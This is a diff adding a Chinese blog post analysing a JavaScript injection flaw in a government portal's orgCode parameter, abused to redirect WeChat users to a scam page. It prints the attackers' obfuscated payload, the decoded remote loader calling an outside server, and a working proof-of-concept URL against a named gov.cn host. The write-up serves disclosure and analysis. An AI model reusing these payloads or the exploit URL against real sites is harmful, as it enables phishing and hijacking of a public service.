@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lqzh.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.16.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="漏洞发现 朋友圈看到有骗人分享，链接是 gov.cn，通过政务网做跳板，绕过微信备案风控。    漏洞分析 抓包溯源链接为  1   https:&#x2F;&#x2F;xxxxxxxxx.gov.cn&#x2F;jxzw&#x2F;ncBmCity&#x2F;getNcBmIndex.do?orgCode&#x3D;%22%3B%7D%29%25%318%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="政务网漏洞">
+<meta property="og:url" content="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="你好，旅行者">
+<meta property="og:description" content="漏洞发现 朋友圈看到有骗人分享，链接是 gov.cn，通过政务网做跳板，绕过微信备案风控。    漏洞分析 抓包溯源链接为  1   https:&#x2F;&#x2F;xxxxxxxxx.gov.cn&#x2F;jxzw&#x2F;ncBmCity&#x2F;getNcBmIndex.do?orgCode&#x3D;%22%3B%7D%29%25%318%">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/1.jpg">
+<meta property="og:image" content="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/2.jpg">
+<meta property="og:image" content="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/3.jpg">
+<meta property="og:image" content="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/4.jpg">
+<meta property="article:published_time" content="2023-05-22T10:14:28.733Z">
+<meta property="article:modified_time" content="2023-05-22T10:14:28.733Z">
+<meta property="article:author" content="lqzh">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/1.jpg">
+
+
+<link rel="canonical" href="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/","path":"2023/05/22/study/web/政务网漏洞/","title":"政务网漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>政务网漏洞 | 你好，旅行者</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?b106d71b3fd9ebb859c788403497c8d1"></script>
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">你好，旅行者</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">愿大地母亲忽悠着你</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook" rel="section"><i class="fa fa-comments fa-fw"></i>留言</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lqzh"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">lqzh</p>
+  <div class="site-description" itemprop="description">咿呀咿呀哟的博客</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lqzhgood" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lqzhgood" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:i@lqzh.me" title="E-Mail → mailto:i@lqzh.me" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lqzh.me/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lqzh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="你好，旅行者">
+      <meta itemprop="description" content="咿呀咿呀哟的博客">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="政务网漏洞 | 你好，旅行者">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          政务网漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-22 18:14:28" itemprop="dateCreated datePublished" datetime="2023-05-22T18:14:28+08:00">2023-05-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/study/" itemprop="url" rel="index"><span itemprop="name">study</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/study/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>朋友圈看到有骗人分享，链接是 <code>gov.cn</code>，通过政务网做跳板，绕过微信备案风控。</p>
+<p><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/1.jpg" alt="朋友圈"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>抓包溯源链接为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22%3B%7D%29%25%318%3Bi2%3D%27bjk%27%3Ba%3D%7B%27l%27%3Athis%2C%27k%27%3A%27%5C163etTimeout%27%2C%27r%27%3A%27a%27%2C%27t%27%3A%27%5C164o%5C142%27%7D%3Ba.l%5Ba.k%5D%28a.l%5Ba.r%2Ba.t%5D%28i2%2B%279ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8%2Fd3g9Jyk%3D%27%2C1%29%29%25%318%3B%24%28function%28%29%20%7Bvar%20orgCode%20%3D%20%22&amp;gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>decodeURIComponent</code> 获取得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=&quot;;&#125;)%18;i2=&#x27;bjk&#x27;;a=&#123;&#x27;l&#x27;:this,&#x27;k&#x27;:&#x27;\\163etTimeout&#x27;,&#x27;r&#x27;:&#x27;a&#x27;,&#x27;t&#x27;:&#x27;\\164o\\142&#x27;&#125;;a.l[a.k](a.l[a.r+a.t](i2+&#x27;9ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8/d3g9Jyk=&#x27;,1))%18;$(function() &#123;var orgCode = &quot;&amp;gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635`</span><br></pre></td></tr></table></figure>
+
+<p>一眼 <code>orgCode</code> 接口未限制，可以任意执行 js。</p>
+<p><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/2.jpg" alt="漏洞发现"></p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>拆解分析后得知，<br>&#96;&#96;<br>“n9&#x3D;document\r\nn9.documentElement.hidden&#x3D;’1’\r\nn9.title&#x3D;’Loading…’\r\nimport(‘&#x2F;&#x2F;v2load.oss-cn-shanghai.aliyuncs.com&#x2F;hz15.js???wx&#x3D;’)”</p>
+<p>&#96;&#96;<br><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/3.jpg" alt="漏洞分析"></p>
+<p>注入后通过 <code>http://v2load.oss-cn-shanghai.aliyuncs.com/hz15.js???wx=</code> 载入远程代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">document.title=&quot;Loading...&quot;;document.documentElement.hidden=1;</span><br><span class="line">(function()&#123;</span><br><span class="line">    var rmd = Math.random().toString(36).substr(2,7);</span><br><span class="line">    var geUrl=&#x27;//47.100.4.56/&#x27;+rmd+&#x27;?ref=&#x27;+encodeURIComponent(location.href.split(&#x27;#&#x27;)[0]);</span><br><span class="line">    var xhr=new XMLHttpRequest;xhr.onload=function()&#123;var onhash=window.onhashchange;var h=xhr.responseText;var a=document.open(&quot;text/html&quot;,&quot;replace&quot;);a.write(h);a.close();window.onhashchange=onhash&#125;;</span><br><span class="line">    xhr.open(&quot;GET&quot;,geUrl,!0);xhr.send();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>最终载入 <code>47.100.4.56</code> (阿里云上海) 服务器上的页面</p>
+<p>尝试在 <code>orgCode</code> 带入不同入参后确认后端无任何过滤，直接返回前端输入导致漏洞</p>
+<p><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/4.jpg" alt="漏洞尝试"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>所以可以通过构造字符串执行任意代码。<br>例如以下链接，弹出 <code>株洲公安</code>，并跳转 <code>株洲市公安局官网</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gzkfq.jxzwfww.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22;alert(%27%E6%A0%AA%E6%B4%B2%E5%85%AC%E5%AE%89%27)%3Bwindow.location.href%3D%22http%3A%2F%2Fgaj.zhuzhou.gov.cn</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/02/10/study/java/javaStudy/" rel="prev" title="Android 开始咯">
+                  <i class="fa fa-chevron-left"></i> Android 开始咯
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lqzh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
